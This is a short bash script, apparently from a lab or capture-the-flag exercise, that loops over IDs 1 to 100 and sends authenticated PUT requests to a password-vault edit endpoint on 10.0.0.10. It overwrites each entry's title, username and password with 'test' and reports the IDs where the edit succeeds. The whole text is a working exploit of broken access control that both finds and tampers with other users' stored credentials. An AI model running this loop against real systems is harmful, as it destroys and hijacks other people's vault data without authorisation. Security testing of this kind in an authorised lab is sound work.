for id in {1..100}; do
  echo "Testing ID: $id"
  curl -s -X PUT http://10.0.0.10/vault/edit/$id \
    -H "Cookie: connect.sid=[session]" \
    -H "Content-Type: application/json" \
    -d '{"vaulttitle":"test","vaultusername":"test","vaultpassword":"test"}' | grep -q '"success":true' && echo "Valid ID: $id"
done